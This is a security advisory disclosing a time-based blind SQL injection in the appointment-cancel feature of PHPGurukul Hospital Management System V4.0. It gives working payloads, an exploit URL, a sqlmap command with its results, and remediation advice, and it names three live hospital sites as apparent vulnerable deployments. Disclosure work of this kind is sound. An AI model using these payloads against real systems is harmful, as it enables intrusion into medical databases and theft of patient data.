# SQL Injection Vulnerability in PHPGurukul Hospital Management System (HMS) V4.0 (User Module)

## 1. Vulnerability Overview

| Field | Content |
| :--- | :--- |
| **System Name** | PHPGurukul Hospital Management System (HMS) |
| **Vendor Website** | [https://phpgurukul.com/](https://phpgurukul.com/) |
| **Affected Version** | V4.0 (Latest) and some older versions |
| **Vulnerability Type** | SQL Injection (SQLi) |
| **Vulnerable File** | `/hospital/hms/appointment-history.php` |
| **Severity** | **High** (Sensitive Medical Data Leakage, Privilege Escalation) |
| **Reporter** | yan1451 |
| **Date** | 2026-01-30 |

---

## 2. Vulnerability Description

A hidden **SQL Injection vulnerability** was discovered in the user module (`/hospital/hms/appointment-history.php`) of the **PHPGurukul Hospital Management System (HMS) V4.0**.

The vulnerability exists in the logic that handles the "Cancel Appointment" function, controlled by the `cancel` parameter. An attacker with a standard patient account (low privilege) can trigger this vulnerability by appending `&cancel=1` to the request URL.

The backend code directly concatenates the unfiltered `id` parameter into a SQL `UPDATE` statement. This allows an attacker to use Time-based Blind injection techniques to execute arbitrary SQL commands, potentially dumping sensitive information such as doctor accounts, patient medical records, and administrator credentials.

---

## 3. Technical Analysis

### Vulnerable Code Logic
The vulnerability is located in `appointment-history.php`. The code checks if the `$_GET['cancel']` parameter exists. If it does, it directly takes the `$_GET['id']` value and inserts it into the SQL query without any validation or parameter binding.

**File:** `hospital/hms/appointment-history.php`

```php
// File: hospital/hms/appointment-history.php

if(isset($_GET['cancel'])) // Trigger condition
{
    // [Vulnerability] Direct concatenation of 'id' into the UPDATE statement
    mysqli_query($con,"update appointment set userStatus='0' where id = '".$_GET['id']."'");
    
    $_SESSION['msg']="Your appointment canceled !!";
}
```
<img width="415" height="247" alt="77ac6cb77f2cb42c303b9123e335b87d" src="https://github.com/user-attachments/assets/24302e91-5bfd-465a-b098-b34d4e25ae8d" />

### Exploit Conditions
* **Access Level:** Low (Requires a standard User/Patient account).
* **Trigger:** The URL must explicitly include `cancel=1` to enter the vulnerable code block.

**Payload (Time-Based Blind):**
```sql
1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+
```

---

## 4. Proof of Concept (Reproduction Steps)

1.  **Setup:** Deploy PHPGurukul HMS V4.0 on a local server (Localhost).
2.  **Access:** Log in with a standard patient account.
3.  **Attack:** Navigate to the "Appointment History" page. Modify the URL (via browser or Burp Suite) to include `&cancel=1` and set the `id` to the payload:
    ```http
    http://localhost/Hospital-Management-System-PHP/hospital/hms/appointment-history.php?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--+&cancel=1
    ```
4.  **Result:** The server response time is delayed by approximately **5 seconds**, confirming that the `SLEEP(5)` command was successfully executed by the database.

<img width="415" height="249" alt="f8beed42e249d77d685e331d01502e16" src="https://github.com/user-attachments/assets/70acfb43-a8f8-47fa-8f0c-e47c5104aeed" />

---

## 5. Deep Verification & Automated Testing

To further confirm the severity and the ability to extract data, the vulnerability was verified using SQLMap and Burp Suite.

### 5.1 Database Enumeration (SQLMap)
**Objective:** Extract database core fields using a standard user session.
**Tool:** SQLMap (Level 3).
**Command:**
```bash
python sqlmap.py -r appoint.txt -p id --technique=T --level=3 --dbms=mysql --batch --current-user --current-db
```
**Result:** SQLMap successfully extracted the highest privilege account information:
* **Current User:** `'root@localhost'`
* **Current Database:** `'hms'`

<img width="415" height="166" alt="580de75ff4594650cf8a15bb7f1c6647" src="https://github.com/user-attachments/assets/977e131f-97ba-4721-84ca-03d80c20e570" />

### 5.2 Injection Logic Validation (Burp Suite)
**Payload:** `id=1' OR SLEEP(5)--+&cancel=update`
**Observation:** The server response time was **10,053 ms** (approx. 10 seconds).
**Analysis:** The test account had 2 appointment records. The `OR` logic forced the database to execute `SLEEP(5)` for *every* record in the table, resulting in a total delay of 2 * 5s = 10s. This confirms the SQL statement was successfully hijacked.

<img width="415" height="232" alt="8f6a619894085cb2d62a26bc6ad09f30" src="https://github.com/user-attachments/assets/40c5f3fb-0b52-40ce-a6e2-b14b3966beb9" />

---

## 6. Publicly Affected Instances (Internet Case Studies)

A fingerprint search (Fingerprint: "Hospital Management System" / URL structure) confirmed that this software is widely deployed.

* **Case 1:** `http://beeyo.et/hms/` (Ethiopian medical site; login page matches fingerprint).
* **Case 2:** `http://apexcareshospital.com/hms/` (Apex Cares Hospital; backend path matches).
* **Case 3:** `http://49.249.28.218:8081/.../hms/admin/` (IP-based site retaining full path characteristics).

*(Note: These examples are for fingerprint verification only; no active attacks were performed on these targets.)*

---

## 7. Remediation Suggestions

1.  **Use Prepared Statements:** The vendor must update the code to use `mysqli_prepare` and `mysqli_stmt_bind_param`. This is the only effective way to prevent SQL injection by separating data from execution logic.
2.  **Integer Casting:** Since the `id` field is expected to be a number, use `intval()` to force type conversion:
    ```php
    $id = intval($_GET['id']);
    ```
3.  **WAF Configuration:** Configure Web Application Firewalls to intercept requests to `appointment-history.php` containing SQL keywords (e.g., `UNION`, `SELECT`, `SLEEP`).
